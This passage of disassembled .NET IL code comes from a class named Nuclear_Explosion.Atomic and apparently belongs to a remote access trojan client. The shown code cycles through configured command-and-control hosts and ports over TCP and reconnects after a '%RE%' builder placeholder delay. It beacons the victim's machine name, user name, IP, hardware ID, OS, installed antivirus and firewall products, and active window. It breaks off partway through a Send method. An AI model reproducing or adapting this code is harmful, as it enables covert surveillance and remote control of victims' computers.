                                                                                                                             object[],
                                                                                                                             string[])
      IL_032e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0333:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0338:  nop
      IL_0339:  ldloc.0
      IL_033a:  ldnull
      IL_033b:  ldstr      "Dispose"
      IL_0340:  ldc.i4.0
      IL_0341:  newarr     [mscorlib]System.Object
      IL_0346:  ldnull
      IL_0347:  ldnull
      IL_0348:  ldnull
      IL_0349:  ldc.i4.1
      IL_034a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_034f:  pop
      IL_0350:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0355:  stloc.0
      IL_0356:  ldloc.s    V_13
      IL_0358:  callvirt   instance int32 [mscorlib]System.Array::get_Length()
      IL_035d:  ldc.i4.2
      IL_035e:  ceq
      IL_0360:  stloc.s    V_15
      IL_0362:  ldloc.s    V_15
      IL_0364:  brfalse    IL_043f

      IL_0369:  ldloc.0
      IL_036a:  ldnull
      IL_036b:  ldstr      "Write"
      IL_0370:  ldc.i4.3
      IL_0371:  newarr     [mscorlib]System.Object
      IL_0376:  dup
      IL_0377:  ldc.i4.0
      IL_0378:  ldloc.s    V_13
      IL_037a:  stloc.s    V_16
      IL_037c:  ldloc.s    V_16
      IL_037e:  ldc.i4.1
      IL_037f:  newarr     [mscorlib]System.Object
      IL_0384:  dup
      IL_0385:  ldc.i4.0
      IL_0386:  ldc.i4.1
      IL_0387:  box        [mscorlib]System.Int32
      IL_038c:  dup
      IL_038d:  stloc.s    V_17
      IL_038f:  stelem.ref
      IL_0390:  ldnull
      IL_0391:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_0396:  stelem.ref
      IL_0397:  dup
      IL_0398:  ldc.i4.1
      IL_0399:  ldc.i4.0
      IL_039a:  box        [mscorlib]System.Int32
      IL_039f:  stelem.ref
      IL_03a0:  dup
      IL_03a1:  ldc.i4.2
      IL_03a2:  ldloc.s    V_13
      IL_03a4:  ldc.i4.1
      IL_03a5:  newarr     [mscorlib]System.Object
      IL_03aa:  dup
      IL_03ab:  ldc.i4.0
      IL_03ac:  ldc.i4.1
      IL_03ad:  box        [mscorlib]System.Int32
      IL_03b2:  stelem.ref
      IL_03b3:  ldnull
      IL_03b4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_03b9:  dup
      IL_03ba:  stloc.s    V_18
      IL_03bc:  ldnull
      IL_03bd:  ldstr      "length"
      IL_03c2:  ldc.i4.0
      IL_03c3:  newarr     [mscorlib]System.Object
      IL_03c8:  ldnull
      IL_03c9:  ldnull
      IL_03ca:  ldnull
      IL_03cb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_03d0:  stelem.ref
      IL_03d1:  dup
      IL_03d2:  stloc.s    V_10
      IL_03d4:  ldnull
      IL_03d5:  ldnull
      IL_03d6:  ldc.i4.3
      IL_03d7:  newarr     [mscorlib]System.Boolean
      IL_03dc:  dup
      IL_03dd:  ldc.i4.0
      IL_03de:  ldc.i4.1
      IL_03df:  stelem.i1
      IL_03e0:  dup
      IL_03e1:  ldc.i4.2
      IL_03e2:  ldc.i4.1
      IL_03e3:  stelem.i1
      IL_03e4:  dup
      IL_03e5:  stloc.s    V_11
      IL_03e7:  ldc.i4.1
      IL_03e8:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_03ed:  pop
      IL_03ee:  ldloc.s    V_11
      IL_03f0:  ldc.i4.0
      IL_03f1:  ldelem.u1
      IL_03f2:  brtrue.s   IL_03f6

      IL_03f4:  br.s       IL_0413

      IL_03f6:  ldloc.s    V_16
      IL_03f8:  ldc.i4.2
      IL_03f9:  newarr     [mscorlib]System.Object
      IL_03fe:  dup
      IL_03ff:  ldc.i4.0
      IL_0400:  ldloc.s    V_17
      IL_0402:  stelem.ref
      IL_0403:  dup
      IL_0404:  ldc.i4.1
      IL_0405:  ldloc.s    V_10
      IL_0407:  ldc.i4.0
      IL_0408:  ldelem.ref
      IL_0409:  stelem.ref
      IL_040a:  ldnull
      IL_040b:  ldc.i4.1
      IL_040c:  ldc.i4.0
      IL_040d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexSetComplex(object,
                                                                                                                                  object[],
                                                                                                                                  string[],
                                                                                                                                  bool,
                                                                                                                                  bool)
      IL_0412:  nop
      IL_0413:  ldloc.s    V_11
      IL_0415:  ldc.i4.2
      IL_0416:  ldelem.u1
      IL_0417:  brtrue.s   IL_041b

      IL_0419:  br.s       IL_043a

      IL_041b:  ldloc.s    V_18
      IL_041d:  ldnull
      IL_041e:  ldstr      "length"
      IL_0423:  ldc.i4.1
      IL_0424:  newarr     [mscorlib]System.Object
      IL_0429:  dup
      IL_042a:  ldc.i4.0
      IL_042b:  ldloc.s    V_10
      IL_042d:  ldc.i4.2
      IL_042e:  ldelem.ref
      IL_042f:  stelem.ref
      IL_0430:  ldnull
      IL_0431:  ldnull
      IL_0432:  ldc.i4.1
      IL_0433:  ldc.i4.1
      IL_0434:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSetComplex(object,
                                                                                                                             class [mscorlib]System.Type,
                                                                                                                             string,
                                                                                                                             object[],
                                                                                                                             string[],
                                                                                                                             class [mscorlib]System.Type[],
                                                                                                                             bool,
                                                                                                                             bool)
      IL_0439:  nop
      IL_043a:  br         IL_02a7

      IL_043f:  nop
      IL_0440:  nop
      IL_0441:  nop
      IL_0442:  nop
      IL_0443:  nop
      IL_0444:  leave.s    IL_0453

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0446:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_044b:  nop
      IL_044c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0451:  leave.s    IL_0460

    }  // end handler
    IL_0453:  nop
    IL_0454:  ldc.i4.1
    IL_0455:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_045a:  nop
    IL_045b:  br         IL_0009

    IL_0460:  nop
    .try
    {
      IL_0461:  nop
      .try
      {
        IL_0462:  nop
        IL_0463:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_0468:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
        IL_046d:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
        IL_0472:  call       bool Nuclear_Explosion.Atomic::EmptyWorkingSet(int64)
        IL_0477:  pop
        IL_0478:  leave.s    IL_0487

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_047a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_047f:  nop
        IL_0480:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0485:  leave.s    IL_0487

      }  // end handler
      IL_0487:  nop
      IL_0488:  leave.s    IL_0497

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_048a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_048f:  nop
      IL_0490:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0495:  leave.s    IL_0497

    }  // end handler
    IL_0497:  nop
    IL_0498:  ldarg.0
    IL_0499:  ldc.i4.0
    IL_049a:  stfld      bool Nuclear_Explosion.Atomic::Cn
    .try
    {
      IL_049f:  nop
      IL_04a0:  ldarg.0
      IL_04a1:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_04a6:  ldnull
      IL_04a7:  ldstr      "Client"
      IL_04ac:  ldc.i4.0
      IL_04ad:  newarr     [mscorlib]System.Object
      IL_04b2:  ldnull
      IL_04b3:  ldnull
      IL_04b4:  ldnull
      IL_04b5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_04ba:  ldnull
      IL_04bb:  ldstr      "Disconnect"
      IL_04c0:  ldc.i4.1
      IL_04c1:  newarr     [mscorlib]System.Object
      IL_04c6:  dup
      IL_04c7:  ldc.i4.0
      IL_04c8:  ldc.i4.0
      IL_04c9:  box        [mscorlib]System.Boolean
      IL_04ce:  stelem.ref
      IL_04cf:  ldnull
      IL_04d0:  ldnull
      IL_04d1:  ldnull
      IL_04d2:  ldc.i4.1
      IL_04d3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_04d8:  pop
      IL_04d9:  leave.s    IL_04e8

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_04db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_04e0:  nop
      IL_04e1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_04e6:  leave.s    IL_04e8

    }  // end handler
    IL_04e8:  nop
    .try
    {
      IL_04e9:  nop
      IL_04ea:  ldloc.0
      IL_04eb:  ldnull
      IL_04ec:  ldstr      "Dispose"
      IL_04f1:  ldc.i4.0
      IL_04f2:  newarr     [mscorlib]System.Object
      IL_04f7:  ldnull
      IL_04f8:  ldnull
      IL_04f9:  ldnull
      IL_04fa:  ldc.i4.1
      IL_04fb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0500:  pop
      IL_0501:  leave.s    IL_0510

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0503:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0508:  nop
      IL_0509:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_050e:  leave.s    IL_0510

    }  // end handler
    IL_0510:  nop
    IL_0511:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0516:  stloc.0
    IL_0517:  ldc.i4.0
    IL_0518:  stloc.2
    IL_0519:  ldarg.0
    IL_051a:  ldfld      string[] Nuclear_Explosion.Atomic::Hosts
    IL_051f:  ldlen
    IL_0520:  conv.i4
    IL_0521:  ldc.i4.2
    IL_0522:  sub.ovf
    IL_0523:  stloc.s    V_19
    IL_0525:  ldc.i4.0
    IL_0526:  stloc.s    V_20
    IL_0528:  br         IL_0801

    IL_052d:  nop
    .try
    {
      IL_052e:  nop
      IL_052f:  ldarg.0
      IL_0530:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
      IL_0535:  dup
      IL_0536:  ldc.i4.m1
      IL_0537:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveTimeout(int32)
      IL_053c:  nop
      IL_053d:  dup
      IL_053e:  ldc.i4.m1
      IL_053f:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendTimeout(int32)
      IL_0544:  nop
      IL_0545:  dup
      IL_0546:  ldc.i4     0xf423f
      IL_054b:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_SendBufferSize(int32)
      IL_0550:  nop
      IL_0551:  dup
      IL_0552:  ldc.i4     0xf423f
      IL_0557:  callvirt   instance void [System]System.Net.Sockets.TcpClient::set_ReceiveBufferSize(int32)
      IL_055c:  nop
      IL_055d:  stfld      object Nuclear_Explosion.Atomic::C
      IL_0562:  ldc.i4.0
      IL_0563:  stloc.1
      IL_0564:  ldarg.0
      IL_0565:  call       instance object Nuclear_Explosion.Atomic::CK()
      IL_056a:  ldnull
      IL_056b:  ldstr      "Connect"
      IL_0570:  ldc.i4.2
      IL_0571:  newarr     [mscorlib]System.Object
      IL_0576:  dup
      IL_0577:  ldc.i4.0
      IL_0578:  ldarg.0
      IL_0579:  ldfld      string[] Nuclear_Explosion.Atomic::Hosts
      IL_057e:  ldloc.s    V_20
      IL_0580:  ldelema    [mscorlib]System.String
      IL_0585:  dup
      IL_0586:  stloc.s    V_21
      IL_0588:  ldind.ref
      IL_0589:  stelem.ref
      IL_058a:  dup
      IL_058b:  ldc.i4.1
      IL_058c:  ldarg.0
      IL_058d:  ldfld      string[] Nuclear_Explosion.Atomic::Ports
      IL_0592:  ldloc.s    V_20
      IL_0594:  ldelema    [mscorlib]System.String
      IL_0599:  dup
      IL_059a:  stloc.s    V_22
      IL_059c:  ldind.ref
      IL_059d:  stelem.ref
      IL_059e:  dup
      IL_059f:  stloc.s    V_10
      IL_05a1:  ldnull
      IL_05a2:  ldnull
      IL_05a3:  ldc.i4.2
      IL_05a4:  newarr     [mscorlib]System.Boolean
      IL_05a9:  dup
      IL_05aa:  ldc.i4.0
      IL_05ab:  ldc.i4.1
      IL_05ac:  stelem.i1
      IL_05ad:  dup
      IL_05ae:  ldc.i4.1
      IL_05af:  ldc.i4.1
      IL_05b0:  stelem.i1
      IL_05b1:  dup
      IL_05b2:  stloc.s    V_11
      IL_05b4:  ldc.i4.1
      IL_05b5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_05ba:  pop
      IL_05bb:  ldloc.s    V_11
      IL_05bd:  ldc.i4.0
      IL_05be:  ldelem.u1
      IL_05bf:  brtrue.s   IL_05c3

      IL_05c1:  br.s       IL_05e3

      IL_05c3:  ldloc.s    V_21
      IL_05c5:  ldloc.s    V_10
      IL_05c7:  ldc.i4.0
      IL_05c8:  ldelem.ref
      IL_05c9:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_05ce:  ldtoken    [mscorlib]System.String
      IL_05d3:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_05d8:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_05dd:  castclass  [mscorlib]System.String
      IL_05e2:  stind.ref
      IL_05e3:  ldloc.s    V_11
      IL_05e5:  ldc.i4.1
      IL_05e6:  ldelem.u1
      IL_05e7:  brtrue.s   IL_05eb

      IL_05e9:  br.s       IL_060b

      IL_05eb:  ldloc.s    V_22
      IL_05ed:  ldloc.s    V_10
      IL_05ef:  ldc.i4.1
      IL_05f0:  ldelem.ref
      IL_05f1:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_05f6:  ldtoken    [mscorlib]System.String
      IL_05fb:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0600:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0605:  castclass  [mscorlib]System.String
      IL_060a:  stind.ref
      IL_060b:  ldarg.0
      IL_060c:  ldc.i4.1
      IL_060d:  stfld      bool Nuclear_Explosion.Atomic::Cn
      IL_0612:  ldarg.0
      IL_0613:  ldnull
      IL_0614:  ldstr      "Send"
      IL_0619:  ldc.i4.1
      IL_061a:  newarr     [mscorlib]System.Object
      IL_061f:  dup
      IL_0620:  ldc.i4.0
      IL_0621:  ldstr      "Information"
      IL_0626:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_062b:  ldarg.0
      IL_062c:  ldfld      string Nuclear_Explosion.Atomic::ID
      IL_0631:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_0636:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_063b:  ldarg.0
      IL_063c:  ldstr      "_"
      IL_0641:  ldarg.0
      IL_0642:  call       instance string Nuclear_Explosion.Atomic::HWD()
      IL_0647:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_064c:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_0651:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0656:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_065b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0660:  ldarg.0
      IL_0661:  call       instance object Nuclear_Explosion.Atomic::IP()
      IL_0666:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_066b:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_0670:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0675:  ldarg.0
      IL_0676:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_067b:  ldstr      " / "
      IL_0680:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0685:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_068a:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_068f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0694:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_0699:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_069e:  ldarg.0
      IL_069f:  call       instance string Nuclear_Explosion.Atomic::CIVC()
      IL_06a4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_06a9:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_06ae:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_06b3:  ldarg.0
      IL_06b4:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo Nuclear_Explosion.Atomic::DI
      IL_06b9:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_06be:  ldstr      " "
      IL_06c3:  call       string Nuclear_Explosion.Atomic::OP()
      IL_06c8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_06cd:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_06d2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_06d7:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_06dc:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_06e1:  ldarg.0
      IL_06e2:  ldarg.0
      IL_06e3:  call       instance object Nuclear_Explosion.Atomic::MP()
      IL_06e8:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_06ed:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_06f2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_06f7:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_06fc:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0701:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo Nuclear_Explosion.Atomic::DI
      IL_0706:  callvirt   instance uint64 [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_TotalPhysicalMemory()
      IL_070b:  box        [mscorlib]System.UInt64
      IL_0710:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0715:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_071a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_071f:  ldarg.0
      IL_0720:  ldstr      "Select * from AntiVirusProduct"
      IL_0725:  call       instance string Nuclear_Explosion.Atomic::GetProduct(string)
      IL_072a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_072f:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_0734:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0739:  ldarg.0
      IL_073a:  ldstr      "SELECT * FROM FirewallProduct"
      IL_073f:  call       instance string Nuclear_Explosion.Atomic::GetProduct(string)
      IL_0744:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0749:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_074e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0753:  ldarg.0
      IL_0754:  ldfld      string[] Nuclear_Explosion.Atomic::Ports
      IL_0759:  ldarg.0
      IL_075a:  ldfld      int32 Nuclear_Explosion.Atomic::P
      IL_075f:  ldelem.ref
      IL_0760:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0765:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_076a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_076f:  ldarg.0
      IL_0770:  call       instance string Nuclear_Explosion.Atomic::GAW()
      IL_0775:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_077a:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_077f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0784:  ldarg.0
      IL_0785:  call       class [mscorlib]System.Globalization.CultureInfo [mscorlib]System.Globalization.CultureInfo::get_CurrentCulture()
      IL_078a:  callvirt   instance string [mscorlib]System.Globalization.CultureInfo::get_Name()
      IL_078f:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_0794:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0799:  ldsfld     string Nuclear_Explosion.Atomic::Key
      IL_079e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_07a3:  ldstr      "False"
      IL_07a8:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_07ad:  stelem.ref
      IL_07ae:  ldnull
      IL_07af:  ldnull
      IL_07b0:  ldnull
      IL_07b1:  ldc.i4.1
      IL_07b2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_07b7:  pop
      IL_07b8:  ldarg.0
      IL_07b9:  ldloc.s    V_20
      IL_07bb:  stfld      int32 Nuclear_Explosion.Atomic::H
      IL_07c0:  ldarg.0
      IL_07c1:  ldloc.s    V_20
      IL_07c3:  stfld      int32 Nuclear_Explosion.Atomic::P
      IL_07c8:  ldc.i4.1
      IL_07c9:  stloc.2
      IL_07ca:  leave      IL_0009

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_07cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_07d4:  nop
      IL_07d5:  ldstr      "%RE%"
      IL_07da:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_07df:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_07e4:  nop
      IL_07e5:  ldarg.0
      IL_07e6:  ldc.i4.0
      IL_07e7:  stfld      int32 Nuclear_Explosion.Atomic::H
      IL_07ec:  ldarg.0
      IL_07ed:  ldc.i4.0
      IL_07ee:  stfld      int32 Nuclear_Explosion.Atomic::P
      IL_07f3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_07f8:  leave.s    IL_07fa

    }  // end handler
    IL_07fa:  nop
    IL_07fb:  ldloc.s    V_20
    IL_07fd:  ldc.i4.1
    IL_07fe:  add.ovf
    IL_07ff:  stloc.s    V_20
    IL_0801:  ldloc.s    V_20
    IL_0803:  ldloc.s    V_19
    IL_0805:  ble        IL_052d

    IL_080a:  ldloc.2
    IL_080b:  stloc.s    V_23
    IL_080d:  ldloc.s    V_23
    IL_080f:  brfalse.s  IL_0818

    IL_0811:  ldc.i4.0
    IL_0812:  stloc.2
    IL_0813:  br         IL_0460

    IL_0818:  nop
    IL_0819:  br         IL_0009
  } // end of method Atomic::MAC

  .method public instance object  CK() cil managed
  {
    // Code size       32 (0x20)
    .maxstack  7
    .locals init (object V_0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      object Nuclear_Explosion.Atomic::C
    IL_0007:  ldnull
    IL_0008:  ldstr      "Client"
    IL_000d:  ldc.i4.0
    IL_000e:  newarr     [mscorlib]System.Object
    IL_0013:  ldnull
    IL_0014:  ldnull
    IL_0015:  ldnull
    IL_0016:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_001b:  stloc.0
    IL_001c:  br.s       IL_001e

    IL_001e:  ldloc.0
    IL_001f:  ret
  } // end of method Atomic::CK

  .method public instance void  Send(uint8[] b) cil managed
  {
    // Code size       573 (0x23d)
    .maxstack  13
    .locals init (bool V_0,
             object V_1,
             object[] V_2,
             bool[] V_3,
             object V_4,
             object V_5)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      bool Nuclear_Explosion.Atomic::Cn
    IL_0007:  ldc.i4.0
    IL_0008:  ceq
    IL_000a:  stloc.0
    IL_000b:  ldloc.0
    IL_000c:  brfalse.s  IL_0013

    IL_000e:  br         IL_023c

    IL_0013:  nop
    .try
    {
      IL_0014:  nop
      IL_0015:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_001a:  stloc.1
      IL_001b:  ldloc.1
      IL_001c:  ldnull
      IL_001d:  ldstr      "Write"
      IL_0022:  ldc.i4.3
      IL_0023:  newarr     [mscorlib]System.Object
      IL_0028:  dup
      IL_0029:  ldc.i4.0
      IL_002a:  ldarg.1
      IL_002b:  stelem.ref
      IL_002c:  dup
      IL_002d:  ldc.i4.1
      IL_002e:  ldc.i4.0
      IL_002f:  box        [mscorlib]System.Int32
      IL_0034:  stelem.ref
      IL_0035:  dup
      IL_0036:  ldc.i4.2
      IL_0037:  ldarg.1
      IL_0038:  ldlen
      IL_0039:  conv.i4
